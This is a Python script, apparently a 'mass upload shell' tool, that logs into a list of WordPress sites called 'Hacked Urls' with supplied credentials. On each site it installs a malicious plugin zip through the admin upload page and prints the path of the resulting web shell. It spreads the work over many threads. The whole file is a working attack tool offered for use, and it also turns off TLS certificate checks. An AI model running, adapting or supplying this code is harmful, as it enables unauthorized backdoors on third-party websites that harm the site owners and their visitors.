#!/usr/bin/python
# -*- coding: utf-8 -*-
#Recoding Doesn't Make You Programmer :)
#============== Moudles ===============#
import os
os.system('pip install requests')

import re
import io
import bs4
import time
import json
import string
import random
import requests
import threading
import configparser
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_toolbelt.multipart.encoder import MultipartEncoder

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#Install Requirements
try:
	import colorama
	import requests
	import termcolor
	from termcolor import colored
except:
	os.system('pip install requests')
	os.system('pip install colorama')
	os.system('pip install termcolor')

config = configparser.ConfigParser()
config.read('Config.ini')
USERNAME = config['DEFAULT']['LOGIN']
PASSWD = config['DEFAULT']['PASSW']

def find_between(s, first, last):
	try:
		start = s.index(first) + len(first)
		end = s.index(last, start)
		return s[start:end]
	except ValueError:
		return ''

def wp_http_referer(link,domain):
	start = re.search(domain,link).span()[1]
	if len(link[start:]) == 0:
		return '/wp-admin/plugin-install.php?tab=upload'
	else:
		return link[start:] + '/wp-admin/plugin-install.php?tab=upload'

def ascii():
	os.system('cls' if os.name == 'nt' else 'clear')
	"""Prints the ascii logo"""
	print(colored("""
		 ******    **                   **            
		/*////**  /**                  /**            
 **   **/*   /**  /**  ******    ***** /**  ** **   **
//** ** /******   /** //////**  **///**/** ** //** ** 
 //***  /*//// ** /**  ******* /**  // /****   //***  
  **/** /*    /** /** **////** /**   **/**/**   **/** 
 ** //**/*******  ***//********//***** /**//** ** //**
//   // ///////  ///  ////////  /////  //  // //   // 

By xBlacKx | @xBlackx_Coder | Channel:- @xBlackxCoder""",color = 'magenta'))


def Shell_Upload(url):
	xCurl = requests.session()
	headers = {
		'Origin': url.split("/")[0],
		'Referer': url,
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Accept-Language': 'en-US,en;q=0.9',
		'Upgrade-Insecure-Requests': '1',
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.1.2222.33 Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br",
		"Connection": "keep-alive"
	}
	#log=TEST&pwd=TEST&wp-submit=Log+In&redirect_to=http%3A%2F%2F208.109.51.127%2Fwp-admin%2F&testcookie=1
	domain = url.split('/')[2]
	req = xCurl.get(url+'/wp-login.php', headers=headers, verify=False, timeout=200, allow_redirects=True)
	cookies = dict(req.cookies)
	payload = {'log':USERNAME,'pwd':PASSWD,'rememberme': 'forever','wp-submit':'Log+In','redirect_to':url+'/wp-admin','testcookie':'1'}
	WPLogin = xCurl.post(url+'/wp-login.php', data=payload, headers=headers, cookies=cookies, verify=False, timeout=200, allow_redirects=True)

	if 'Welcome to WordPress!' in WPLogin.text:
		filename = "Hacked.zip"
		content = open(filename,'rb')
		Link = url + '/wp-admin/plugin-install.php'
		sq = xCurl.get(Link, headers=headers, verify=False)
		cookie = dict(sq.cookies)
		if sq.status_code != 200:
			print('Something Went Wrong... {}/wp-admin/plugin-install.php responsed {}'.format(url,Link.status_code))
			pass
		wp = find_between(sq.text,'name="_wpnonce" value="','"')
		
		payload = MultipartEncoder(fields={"_wpnonce" : wp, "_wp_http_referer":wp_http_referer(url,domain),'pluginzip':(filename,content,'application/octet-stream'),"install-plugin-submit":'Install Now'})
		header2 = {
		'Origin': url.split("/")[0],
		'Referer': url + '/wp-admin/plugin-install.php', 
		'Host': domain,
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Accept-Language': 'en-US,en;q=0.9',
		'Upgrade-Insecure-Requests': '1',
		'Content-Type': payload.content_type,
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.1.2222.33 Safari/537.36',
		'Accept-Encoding': 'gzip, deflate, br',
		'Connection': "keep-alive"
		}
		r = xCurl.post(url+'/wp-admin/update.php?action=upload-plugin', data=payload, headers=header2,verify=False,cookies=cookies, stream=True)

		if r.status_code == 200:
			if "Plugin installed successfully" in r.text:
				print(colored(f"Shell Uploaded ==> {url}/wp-content/plugins/xB/xBCoderz.php", color="green"))
			elif "Destination folder already exists" in r.text:
				print(colored(f"Plugin Already Installed ! {url}", color="green"))
			else:
				print(colored(f"Unexcepted Error ! ==> {url}", color="magenta"))
		else:
			print(colored(f"Unexcepted Error ! ==> {url}", color="blue"))
	else:
		print(colored(f"Login Failed ! ==> {url}", color="red"))
#Shell_Upload('http://52.229.70.157')
def main():
	ascii()
	print()
	print(colored(f"[+] Starting The Tool WordPress Expolit Mass Upload Shell",color = 'red'))
	sleep(1.5)
	print(colored(f"[-] Private Tool Created By xBlacxk", color="blue"))
	sleep(0.5)
	print(colored(f"[-] This Tool Only Work With My Expolit Not For Orther.!", color="magenta"))
	print()
	File = input(f"[+] Enter Your Hacked Urls List: ")
	Threads = input(f"[+] Enter Threads: ")
	argFile = open(File,'r', encoding='utf-8').read().splitlines()
	threads = []
	with ThreadPoolExecutor(max_workers=int(Threads)) as executor:
		for data in argFile:
			if 'http' not in data:
				fk = "http://"+data
				threads.append(executor.submit(Shell_Upload, fk))
			else:
				threads.append(executor.submit(Shell_Upload, data))
		input()
		
#Work Done Here!
if __name__ == '__main__':
	main()